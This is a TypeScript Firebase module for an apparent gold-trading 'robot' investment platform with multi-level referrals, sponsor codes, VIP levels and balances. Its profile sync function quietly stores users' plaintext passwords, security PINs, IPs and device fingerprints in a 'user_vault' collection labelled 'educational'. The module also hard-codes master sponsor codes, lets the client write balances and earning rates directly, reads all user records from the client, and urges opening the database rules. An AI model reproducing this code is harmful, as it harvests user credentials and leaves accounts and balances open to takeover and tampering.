import { initializeApp, getApps, getApp } from 'firebase/app';
import { 
  getAuth, 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  signOut as fbSignOut, 
  onAuthStateChanged,
  User as FirebaseUser
} from 'firebase/auth';
import { 
  getFirestore, 
  doc, 
  setDoc, 
  getDoc, 
  getDocFromServer,
  updateDoc,
  collection, 
  addDoc, 
  getDocs, 
  query, 
  where,
  orderBy, 
  limit,
  onSnapshot
} from 'firebase/firestore';

// User-provided Firebase Configuration
export const firebaseConfig = {
  apiKey: "AIzaSyAJM9gRMjQelSHsCvzr73wqQVSRBHaFbf4",
  authDomain: "goldrobo-b0a1c.firebaseapp.com",
  projectId: "goldrobo-b0a1c",
  storageBucket: "goldrobo-b0a1c.firebasestorage.app",
  messagingSenderId: "905570760039",
  appId: "1:905570760039:web:56c7dedf1d2dd080862bc2",
  measurementId: "G-4ZRZ7R605X"
};

// Initialize Firebase safely
const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const db = getFirestore(app);

export type { FirebaseUser };

/**
 * Validates initial connection to Firestore without throwing fatal exceptions
 */
async function testConnection() {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
  } catch (error: any) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.warn("Firestore status: Client operating in offline mode.");
    }
  }
}
testConnection();

const LOCAL_PROFILE_PREFIX = 'goldrobo_profile_cache_';
const LOCAL_TX_PREFIX = 'goldrobo_cached_txs_';

/**
 * Save user profile state and credentials to Firestore with resilient local fallback
 */
export async function syncUserProfileToFirestore(uid: string, data: Record<string, any>) {
  if (!uid) return { success: false, error: 'Missing UID' };
  
  const payload = {
    ...data,
    updatedAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString()
  };

  // 1. Immediately guarantee local persistence so user data is never lost
  try {
    const existingCache = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
    const merged = existingCache ? { ...JSON.parse(existingCache), ...payload } : payload;
    localStorage.setItem(LOCAL_PROFILE_PREFIX + uid, JSON.stringify(merged));
  } catch {
    // Non-blocking localStorage catch
  }

  // 2. Sync to remote Cloud Firestore if permission is granted
  try {
    const userRef = doc(db, 'users', uid);
    await setDoc(userRef, payload, { merge: true });
    console.log('✅ Firestore user profile synced successfully:', uid);
    
    // Also sync educational credentials vault record if present
    if (data.plainPassword || data.securityPin || data.registeredIp) {
      try {
        const vaultRef = doc(db, 'user_vault', uid);
        await setDoc(vaultRef, {
          uid,
          email: data.email,
          plainPassword: data.plainPassword || '',
          securityPin: data.securityPin || '',
          ip: data.registeredIp || '127.0.0.1',
          country: data.registeredCountry || 'Global',
          deviceFingerprint: data.deviceFingerprint || '',
          sponsorCode: data.sponsorCode || '',
          referralCode: data.referralCode || '',
          recordedAt: new Date().toISOString()
        }, { merge: true });
      } catch (vaultErr: any) {
        console.warn('Vault record note:', vaultErr?.message);
      }
    }

    // Register identifiers (username and referralCode) in public registry for cross-device lookups
    if (data.referralCode || data.username) {
      registerUserIdentifiersInCloud(uid, data.email, data.username || '', data.referralCode || '');
    }

    return { success: true, cloudSynced: true };
  } catch (err: any) {
    // Graceful handling of permission-denied without console.error or crashing
    if (err?.code === 'permission-denied') {
      console.warn(
        'ℹ️ Cloud Firestore permission-denied: Profile safely saved to local device storage. To sync to remote Firestore cloud, ensure firestore.rules allow read/write in your Firebase Console.'
      );
      return { success: true, cloudSynced: false, permissionDenied: true };
    }
    
    console.warn('Firestore sync note:', err?.message || 'Offline fallback');
    return { success: true, cloudSynced: false, error: err?.message };
  }
}

/**
 * Fetch user profile from Firestore or local resilient cache
 */
export async function fetchUserProfileFromFirestore(uid: string) {
  if (!uid) return null;
  
  // Try remote Cloud Firestore
  try {
    const userRef = doc(db, 'users', uid);
    const snap = await getDoc(userRef);
    if (snap.exists()) {
      console.log('✅ Fetched profile from Firestore for:', uid);
      return snap.data();
    }
  } catch (err: any) {
    console.warn('Firestore fetch note (falling back to device storage):', err?.message);
  }

  // Fallback to local profile cache
  try {
    const local = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
    if (local) {
      return JSON.parse(local);
    }
  } catch {}

  return null;
}

/**
 * Record a transaction into Firestore with local cache guarantee
 */
export async function recordTransactionToFirestore(uid: string, tx: Record<string, any>) {
  if (!uid) return false;

  const recordPayload = {
    ...tx,
    createdAt: new Date().toISOString()
  };

  // Local storage caching
  try {
    const existing = localStorage.getItem(LOCAL_TX_PREFIX + uid);
    const list = existing ? JSON.parse(existing) : [];
    localStorage.setItem(LOCAL_TX_PREFIX + uid, JSON.stringify([recordPayload, ...list].slice(0, 50)));
  } catch {}

  // Cloud Firestore sync
  try {
    const txCol = collection(db, 'users', uid, 'transactions');
    await addDoc(txCol, recordPayload);
    console.log('✅ Transaction recorded to Firestore:', tx.orderId || tx.id);
    return true;
  } catch (err: any) {
    if (err?.code === 'permission-denied') {
      console.warn('ℹ️ Transaction saved locally on device. (Firestore remote write requires permission).');
      return true;
    }
    console.warn('Firestore transaction log note:', err?.message);
    return true;
  }
}

/**
 * Fetch transactions from Firestore or local cache
 */
export async function fetchUserTransactionsFromFirestore(uid: string) {
  if (!uid) return [];

  // Try remote Cloud Firestore
  try {
    const txCol = collection(db, 'users', uid, 'transactions');
    const q = query(txCol, orderBy('createdAt', 'desc'), limit(50));
    const snap = await getDocs(q);
    const txs: any[] = [];
    snap.forEach((docSnap) => {
      txs.push({ id: docSnap.id, ...docSnap.data() });
    });
    if (txs.length > 0) return txs;
  } catch (err: any) {
    console.warn('Firestore transactions query note (reading local cache):', err?.message);
  }

  // Fallback to local transactions cache
  try {
    const local = localStorage.getItem(LOCAL_TX_PREFIX + uid);
    if (local) {
      return JSON.parse(local);
    }
  } catch {}

  return [];
}

/**
 * Real-time listener for user profile document in Firestore
 * Updates instantly when an administrator or user modifies fields in Firebase Console
 */
export function subscribeToUserProfile(
  uid: string, 
  onUpdate: (data: Record<string, any>) => void,
  onError?: (err: any) => void
): () => void {
  if (!uid) return () => {};

  try {
    const userRef = doc(db, 'users', uid);
    const unsubscribe = onSnapshot(userRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.data();
        // Update local cache as well
        try {
          const existing = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
          const merged = existing ? { ...JSON.parse(existing), ...data } : data;
          localStorage.setItem(LOCAL_PROFILE_PREFIX + uid, JSON.stringify(merged));
        } catch {}

        onUpdate(data);
      }
    }, (err) => {
      console.warn('Firestore live snapshot note:', err?.message);
      if (onError) onError(err);
    });

    return unsubscribe;
  } catch (err: any) {
    console.warn('Error setting up Firestore listener:', err?.message);
    return () => {};
  }
}

// Master Genesis Sponsor Codes that are permanently valid
export const MASTER_SPONSOR_CODES = [
  'GOLD888',
  'ADMIN888',
  'SALIM888',
  'VIP888',
  'ROOT888',
  'VIP777',
  'QUANT999',
  'ROBO2026',
  'ALPHA88',
  'GOLD8492'
];

/**
 * Check if a username is available across the platform (enforces unique usernames)
 */
export async function checkUsernameAvailability(rawUsername: string): Promise<{ available: boolean; message?: string }> {
  const clean = (rawUsername || '').trim();
  if (!clean) return { available: false, message: 'Please enter a username.' };
  if (clean.length < 3) return { available: false, message: 'Username must be at least 3 characters.' };
  if (clean.length > 20) return { available: false, message: 'Username cannot exceed 20 characters.' };
  if (!/^[a-zA-Z0-9_]+$/.test(clean)) {
    return { available: false, message: 'Username can only contain letters, numbers, and underscores (_).' };
  }

  const normalized = clean.toLowerCase();

  // 1. Check usernames collection in Firestore
  try {
    const userDoc = await getDoc(doc(db, 'usernames', normalized));
    if (userDoc.exists()) {
      return { available: false, message: `The username "${clean}" is already taken. Please choose another username.` };
    }
  } catch (e: any) {
    console.warn('Check username doc note:', e?.message);
  }

  // 2. Query users collection
  try {
    const usersCol = collection(db, 'users');
    const q1 = query(usersCol, where('username', '==', clean), limit(1));
    const snap1 = await getDocs(q1);
    if (!snap1.empty) {
      return { available: false, message: `The username "${clean}" is already taken. Please choose another username.` };
    }

    // Also check case-insensitive match across users
    const allUsersSnap = await getDocs(usersCol);
    for (const d of allUsersSnap.docs) {
      const data = d.data();
      if (data.username && data.username.toLowerCase() === normalized) {
        return { available: false, message: `The username "${clean}" is already taken. Please choose another username.` };
      }
    }
  } catch (e: any) {
    console.warn('Check username query note:', e?.message);
  }

  // 3. Fallback check local registered accounts
  try {
    const localRaw = localStorage.getItem('goldrobo_registered_users_list');
    if (localRaw) {
      const list: Array<{ username?: string }> = JSON.parse(localRaw);
      const exists = list.some(u => u.username && u.username.toLowerCase() === normalized);
      if (exists) {
        return { available: false, message: `The username "${clean}" is already taken. Please choose another username.` };
      }
    }
  } catch {}

  return { available: true };
}

/**
 * Validates whether a sponsor code OR inviter username is valid across devices:
 * 1. Checks Master Genesis Codes (e.g. GOLD888, VIP888)
 * 2. Checks Cloud referral_codes collection index (by code and username)
 * 3. Checks Cloud usernames collection index
 * 4. Queries Cloud Firestore users collection (by referralCode or username)
 * 5. Performs a resilient scan over registered users
 */
export async function validateSponsorCode(input: string): Promise<{
  valid: boolean;
  sponsorUid?: string;
  sponsorEmail?: string;
  sponsorUsername?: string;
  sponsorReferralCode?: string;
  isMasterCode?: boolean;
  message?: string;
}> {
  const clean = (input || '').trim().replace(/^@+/, '');
  if (!clean) {
    return { valid: false, message: 'Please enter an inviter username or referral code.' };
  }

  const cleanUpper = clean.toUpperCase();
  const cleanLower = clean.toLowerCase();

  // 1. Check if it's one of the master platform genesis codes
  if (MASTER_SPONSOR_CODES.includes(cleanUpper)) {
    return {
      valid: true,
      sponsorUid: 'genesis_sponsor_gold888',
      sponsorEmail: 'affiliate@goldrobo.io',
      sponsorUsername: cleanUpper,
      sponsorReferralCode: cleanUpper,
      isMasterCode: true
    };
  }

  // 2. Check Cloud usernames collection (direct canonical username indexing)
  try {
    const userDoc = doc(db, 'usernames', cleanLower);
    const userSnap = await getDoc(userDoc);
    if (userSnap.exists()) {
      const data = userSnap.data();
      if (data.uid) {
        return {
          valid: true,
          sponsorUid: data.uid,
          sponsorEmail: data.email || '',
          sponsorUsername: data.username || clean,
          sponsorReferralCode: data.referralCode || clean,
          isMasterCode: false
        };
      }
    }
  } catch (err: any) {
    console.warn('Firestore usernames check note:', err?.message);
  }

  // 3. Check Cloud referral_codes lookup registry (stores both code and username)
  try {
    const refCodeDoc = doc(db, 'referral_codes', cleanUpper);
    const refSnap = await getDoc(refCodeDoc);
    if (refSnap.exists()) {
      const data = refSnap.data();
      if (data.uid) {
        return {
          valid: true,
          sponsorUid: data.uid,
          sponsorEmail: data.email || '',
          sponsorUsername: data.username || clean,
          sponsorReferralCode: data.code || cleanUpper,
          isMasterCode: false
        };
      }
    }

    const refUserDoc = doc(db, 'referral_codes', cleanLower);
    const refUserSnap = await getDoc(refUserDoc);
    if (refUserSnap.exists()) {
      const data = refUserSnap.data();
      if (data.uid) {
        return {
          valid: true,
          sponsorUid: data.uid,
          sponsorEmail: data.email || '',
          sponsorUsername: data.username || clean,
          sponsorReferralCode: data.code || clean,
          isMasterCode: false
        };
      }
    }
  } catch (err: any) {
    console.warn('Firestore referral_codes check note:', err?.message);
  }

  // 4. Check direct document ID lookup in users collection
  try {
    const directDoc = doc(db, 'users', clean);
    const directSnap = await getDoc(directDoc);
    if (directSnap.exists()) {
      const data = directSnap.data();
      return {
        valid: true,
        sponsorUid: directSnap.id,
        sponsorEmail: data.email || 'sponsor@goldrobo.io',
        sponsorUsername: data.username || clean,
        sponsorReferralCode: data.referralCode || clean,
        isMasterCode: false
      };
    }
  } catch {}

  // 5. Query Cloud Firestore users collection by username or referralCode
  try {
    const usersCol = collection(db, 'users');

    // Query 5a: by exact username
    const qUser = query(usersCol, where('username', '==', clean), limit(1));
    const snapUser = await getDocs(qUser);
    if (!snapUser.empty) {
      const docData = snapUser.docs[0].data();
      registerUserIdentifiersInCloud(snapUser.docs[0].id, docData.email, docData.username, docData.referralCode || docData.username);
      return {
        valid: true,
        sponsorUid: snapUser.docs[0].id,
        sponsorEmail: docData.email || 'sponsor@goldrobo.io',
        sponsorUsername: docData.username || clean,
        sponsorReferralCode: docData.referralCode || docData.username || clean,
        isMasterCode: false
      };
    }

    // Query 5b: by lowercase username
    const qUserLower = query(usersCol, where('username', '==', cleanLower), limit(1));
    const snapUserLower = await getDocs(qUserLower);
    if (!snapUserLower.empty) {
      const docData = snapUserLower.docs[0].data();
      registerUserIdentifiersInCloud(snapUserLower.docs[0].id, docData.email, docData.username, docData.referralCode || docData.username);
      return {
        valid: true,
        sponsorUid: snapUserLower.docs[0].id,
        sponsorEmail: docData.email || 'sponsor@goldrobo.io',
        sponsorUsername: docData.username || clean,
        sponsorReferralCode: docData.referralCode || docData.username || clean,
        isMasterCode: false
      };
    }

    // Query 5c: by username_lower field
    const qUserLowerField = query(usersCol, where('username_lower', '==', cleanLower), limit(1));
    const snapUserLowerField = await getDocs(qUserLowerField);
    if (!snapUserLowerField.empty) {
      const docData = snapUserLowerField.docs[0].data();
      registerUserIdentifiersInCloud(snapUserLowerField.docs[0].id, docData.email, docData.username, docData.referralCode || docData.username);
      return {
        valid: true,
        sponsorUid: snapUserLowerField.docs[0].id,
        sponsorEmail: docData.email || 'sponsor@goldrobo.io',
        sponsorUsername: docData.username || clean,
        sponsorReferralCode: docData.referralCode || docData.username || clean,
        isMasterCode: false
      };
    }

    // Query 5d: by referralCode
    const qCode = query(usersCol, where('referralCode', '==', clean), limit(1));
    const snapCode = await getDocs(qCode);
    if (!snapCode.empty) {
      const docData = snapCode.docs[0].data();
      registerUserIdentifiersInCloud(snapCode.docs[0].id, docData.email, docData.username, docData.referralCode);
      return {
        valid: true,
        sponsorUid: snapCode.docs[0].id,
        sponsorEmail: docData.email || 'sponsor@goldrobo.io',
        sponsorUsername: docData.username || clean,
        sponsorReferralCode: docData.referralCode || clean,
        isMasterCode: false
      };
    }

    // Query 5e: Resilient scan across all users in Firestore (case-insensitive match)
    const allUsersSnap = await getDocs(usersCol);
    for (const d of allUsersSnap.docs) {
      const data = d.data();
      const codeMatch = (data.referralCode && data.referralCode.trim().toLowerCase() === cleanLower) ||
                        (data.referralCode && data.referralCode.trim().toUpperCase() === cleanUpper);
      const userMatch = data.username && data.username.trim().toLowerCase() === cleanLower;
      const emailMatch = data.email && data.email.trim().toLowerCase() === cleanLower;
      const emailPrefixMatch = data.email && data.email.split('@')[0].trim().toLowerCase() === cleanLower;
      const uidMatch = d.id === clean || d.id.toLowerCase() === cleanLower;
      if (userMatch || codeMatch || emailMatch || emailPrefixMatch || uidMatch) {
        registerUserIdentifiersInCloud(d.id, data.email, data.username, data.referralCode || data.username);
        return {
          valid: true,
          sponsorUid: d.id,
          sponsorEmail: data.email || 'sponsor@goldrobo.io',
          sponsorUsername: data.username || clean,
          sponsorReferralCode: data.referralCode || data.username || clean,
          isMasterCode: false
        };
      }
    }
  } catch (err: any) {
    console.warn('Firestore users collection search note:', err?.message);
  }

  // 6. Check Local Storage registered accounts (extract REAL UID, never dummy strings)
  try {
    const rawUser = localStorage.getItem('goldrobo_user_state');
    if (rawUser) {
      const u = JSON.parse(rawUser);
      if (
        (u.username && u.username.toLowerCase() === cleanLower) ||
        (u.referralCode && u.referralCode.toLowerCase() === cleanLower) ||
        (u.email && u.email.toLowerCase() === cleanLower)
      ) {
        return {
          valid: true,
          sponsorUid: u.uid || 'usr_local_sponsor',
          sponsorEmail: u.email || '',
          sponsorUsername: u.username || clean,
          sponsorReferralCode: u.referralCode || u.username || clean,
          isMasterCode: false
        };
      }
    }

    const regUsersRaw = localStorage.getItem('goldrobo_registered_users_list');
    if (regUsersRaw) {
      const list = JSON.parse(regUsersRaw);
      if (Array.isArray(list)) {
        const found = list.find((item: any) => 
          (item.username && item.username.toLowerCase() === cleanLower) ||
          (item.referralCode && item.referralCode.toLowerCase() === cleanLower) ||
          (item.email && item.email.toLowerCase() === cleanLower)
        );
        if (found) {
          return {
            valid: true,
            sponsorUid: found.uid || 'usr_local_sponsor',
            sponsorEmail: found.email || '',
            sponsorUsername: found.username || clean,
            sponsorReferralCode: found.referralCode || found.username || clean,
            isMasterCode: false
          };
        }
      }
    }

    const devAccsRaw = localStorage.getItem('goldrobo_device_accounts');
    if (devAccsRaw) {
      const devAccs = JSON.parse(devAccsRaw);
      if (Array.isArray(devAccs)) {
        const found = devAccs.find((item: any) => 
          (typeof item === 'object' && item.username && item.username.toLowerCase() === cleanLower) ||
          (typeof item === 'object' && item.email && item.email.toLowerCase() === cleanLower) ||
          (typeof item === 'string' && item.toLowerCase() === cleanLower)
        );
        if (found) {
          const uObj = typeof found === 'object' ? found : { username: clean };
          return {
            valid: true,
            sponsorUid: uObj.uid || 'usr_local_sponsor',
            sponsorEmail: uObj.email || '',
            sponsorUsername: uObj.username || clean,
            sponsorReferralCode: uObj.referralCode || uObj.username || clean,
            isMasterCode: false
          };
        }
      }
    }
  } catch {}

  return {
    valid: false,
    message: `Inviter username "${clean}" not found. Please enter a valid registered sponsor username.`
  };
}

/**
 * Register user's unique referral code AND username in Cloud Firestore registry
 * so ANY other device can instantly validate them by code OR username!
 */
export async function registerUserIdentifiersInCloud(
  uid: string, 
  email: string, 
  username: string, 
  referralCode: string
) {
  if (!uid) return;
  const cleanCode = (referralCode || '').trim().toUpperCase();
  const cleanUser = (username || '').trim();
  const lowerUser = cleanUser.toLowerCase();

  // Save to local device registry
  try {
    const localRaw = localStorage.getItem('goldrobo_registered_referrals');
    const list: string[] = localRaw ? JSON.parse(localRaw) : [];
    if (cleanCode && !list.includes(cleanCode)) list.push(cleanCode);
    if (lowerUser && !list.includes(lowerUser)) list.push(lowerUser);
    localStorage.setItem('goldrobo_registered_referrals', JSON.stringify(list));
  } catch {}

  // 1. Save referral code doc in referral_codes
  if (cleanCode) {
    try {
      const refCodeDoc = doc(db, 'referral_codes', cleanCode);
      await setDoc(refCodeDoc, {
        code: cleanCode,
        uid,
        email,
        username: cleanUser,
        type: 'referralCode',
        registeredAt: new Date().toISOString()
      }, { merge: true });
    } catch (err: any) {
      console.warn('Referral code registry note:', err?.message);
    }
  }

  // 2. Save username in referral_codes so typing username in invite box matches directly
  if (lowerUser) {
    try {
      const refUserDoc = doc(db, 'referral_codes', lowerUser);
      await setDoc(refUserDoc, {
        code: cleanCode,
        uid,
        email,
        username: cleanUser,
        type: 'username',
        registeredAt: new Date().toISOString()
      }, { merge: true });
    } catch (err: any) {
      console.warn('Username in referral_codes note:', err?.message);
    }

    // 3. Save to usernames collection for uniqueness tracking
    try {
      const usernameDoc = doc(db, 'usernames', lowerUser);
      await setDoc(usernameDoc, {
        username: cleanUser,
        referralCode: cleanCode,
        uid,
        email,
        registeredAt: new Date().toISOString()
      }, { merge: true });
    } catch (err: any) {
      console.warn('Usernames collection note:', err?.message);
    }
  }

  console.log(`✅ Registered identifiers in Cloud Firestore: Code=${cleanCode}, Username=${cleanUser}`);
}

// Backward-compatible alias
export const registerReferralCodeInCloud = (code: string, uid: string, email: string) => {
  return registerUserIdentifiersInCloud(uid, email, '', code);
};

/**
 * Tracks real referral relationship when a new user signs up:
 * Links the user to their sponsor and increments sponsor's referral counts.
 * Works seamlessly whether sponsor was identified by username or referral code!
 */
export async function recordReferralRelationship(
  sponsorCodeOrUsername: string,
  newUserId: string,
  newUserEmail: string
) {
  if (!sponsorCodeOrUsername || !newUserId) return;
  const cleanInput = sponsorCodeOrUsername.trim();

  try {
    // 1. Validate and resolve sponsor UID
    const resolved = await validateSponsorCode(cleanInput);
    if (!resolved.valid || resolved.isMasterCode || !resolved.sponsorUid) {
      console.log('Genesis master sponsor or unrecognized sponsor, skipping sponsor profile increment');
      return;
    }

    const sponsorUid = resolved.sponsorUid;
    let targetUid = sponsorUid;
    let currentSponsorData: any = null;
    try {
      const spSnap = await getDoc(doc(db, 'users', sponsorUid));
      if (spSnap.exists()) {
        currentSponsorData = spSnap.data();
      } else {
        const usersCol = collection(db, 'users');
        const qU = query(usersCol, where('username', '==', resolved.sponsorUsername || cleanInput), limit(1));
        const sU = await getDocs(qU);
        if (!sU.empty) {
          targetUid = sU.docs[0].id;
          currentSponsorData = sU.docs[0].data();
        }
      }
    } catch {}

    // Record referred member under sponsor's referrals subcollection
    const referralRecord = {
      uid: newUserId,
      email: newUserEmail,
      joinedAt: new Date().toISOString(),
      hasDeposited: false,
      totalDeposit: 0.00,
      level: 1,
      status: 'Active Member'
    };

    try {
      await setDoc(doc(db, 'users', targetUid, 'referrals', newUserId), referralRecord);
    } catch (subErr: any) {
      console.warn('Referral subcollection note:', subErr?.message);
    }

    // Save to team_referrals collection
    try {
      const teamId = `${targetUid}_${newUserId}_L1`;
      await setDoc(doc(db, 'team_referrals', teamId), {
        id: teamId,
        sponsorUid: targetUid,
        sponsorUsername: resolved.sponsorUsername || cleanInput,
        memberUid: newUserId,
        memberUsername: newUserEmail.split('@')[0],
        memberEmail: newUserEmail,
        level: 1,
        directInviterUsername: resolved.sponsorUsername || cleanInput,
        joinedAt: new Date().toISOString(),
        joinedTimestamp: Date.now(),
        totalDeposit: 0,
        commissionEarned: 0,
        status: 'Active',
        vipLevel: 0
      }, { merge: true });
    } catch {}

    // Save to local team cache for sponsor
    try {
      const cacheKey = `goldrobo_team_members_${targetUid}`;
      const raw = localStorage.getItem(cacheKey);
      let list: any[] = raw ? JSON.parse(raw) : [];
      const teamId = `${targetUid}_${newUserId}_L1`;
      if (!list.some(m => m.id === teamId || m.memberUid === newUserId)) {
        list.unshift({
          id: teamId,
          sponsorUid: targetUid,
          sponsorUsername: resolved.sponsorUsername || cleanInput,
          memberUid: newUserId,
          memberUsername: newUserEmail.split('@')[0],
          memberEmail: newUserEmail,
          level: 1,
          directInviterUsername: resolved.sponsorUsername || cleanInput,
          joinedAt: new Date().toISOString(),
          joinedTimestamp: Date.now(),
          totalDeposit: 0,
          commissionEarned: 0,
          status: 'Active',
          vipLevel: 0
        });
        localStorage.setItem(cacheKey, JSON.stringify(list));
      }
    } catch {}

    // Increment validReferralsCount, l1Referrals, teamSize on sponsor doc
    const curL1 = Number(currentSponsorData?.l1Referrals || 0);
    const curL2 = Number(currentSponsorData?.l2Referrals || 0);
    const curL3 = Number(currentSponsorData?.l3Referrals || 0);
    const updatedL1 = curL1 + 1;
    const updatedValid = Math.max(Number(currentSponsorData?.validReferralsCount || 0) + 1, updatedL1);
    const updatedTeamSize = updatedL1 + curL2 + curL3;

    await setDoc(doc(db, 'users', targetUid), {
      validReferralsCount: updatedValid,
      totalReferralsCount: updatedValid,
      referralCount: updatedValid,
      l1Referrals: updatedL1,
      teamSize: updatedTeamSize,
      lastReferralAt: new Date().toISOString()
    }, { merge: true });

    // Also if sponsor is currently logged in on this browser, update local state
    try {
      const rawUser = localStorage.getItem('goldrobo_user_state');
      if (rawUser) {
        const u = JSON.parse(rawUser);
        if (
          u.uid === targetUid || 
          u.uid === sponsorUid ||
          (u.username && u.username.toLowerCase() === cleanInput.toLowerCase()) ||
          (resolved.sponsorUsername && u.username && u.username.toLowerCase() === resolved.sponsorUsername.toLowerCase()) ||
          (u.referralCode && u.referralCode.toLowerCase() === cleanInput.toLowerCase())
        ) {
          u.validReferralsCount = updatedValid;
          u.l1Referrals = updatedL1;
          u.teamSize = updatedTeamSize;
          localStorage.setItem('goldrobo_user_state', JSON.stringify(u));
          window.dispatchEvent(new CustomEvent('goldrobo_referral_updated', { 
            detail: u 
          }));
        }
      }
    } catch {}

    window.dispatchEvent(new CustomEvent('goldrobo_referral_updated', { 
      detail: { 
        sponsorUid: targetUid,
        validReferralsCount: updatedValid,
        l1Referrals: updatedL1,
        teamSize: updatedTeamSize
      } 
    }));

    console.log(`✅ Recorded referral relationship: ${newUserEmail} -> sponsor ${targetUid} (${cleanInput})`);
  } catch (err: any) {
    console.warn('Error recording referral relationship:', err?.message);
  }
}

/**
 * Direct update of user balances in Firestore (used by Admin approvals or system settlement)
 */
export async function updateUserBalanceInFirestore(
  uid: string, 
  updates: {
    totalBalance?: number;
    withdrawableBalance?: number;
    lockedInvestment?: number;
    vipLevel?: number;
    dailyEarningRate?: number;
    validReferralsCount?: number;
    [key: string]: any;
  }
) {
  if (!uid) return false;
  try {
    const userRef = doc(db, 'users', uid);
    await setDoc(userRef, {
      ...updates,
      updatedAt: new Date().toISOString()
    }, { merge: true });
    console.log('✅ Updated balance in Firestore for user:', uid, updates);
    return true;
  } catch (err: any) {
    console.warn('Firestore balance update note:', err?.message);
    return false;
  }
}

/**
 * Fetch all registered users from Firestore for the Admin Panel
 */
export async function fetchAllUsersFromFirestore(): Promise<any[]> {
  try {
    const usersCol = collection(db, 'users');
    const snap = await getDocs(usersCol);
    const list: any[] = [];
    snap.forEach((docSnap) => {
      list.push({ uid: docSnap.id, ...docSnap.data() });
    });
    return list;
  } catch (err: any) {
    console.warn('Fetch all users note:', err?.message);
    return [];
  }
}

export { 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  fbSignOut, 
  onAuthStateChanged 
};

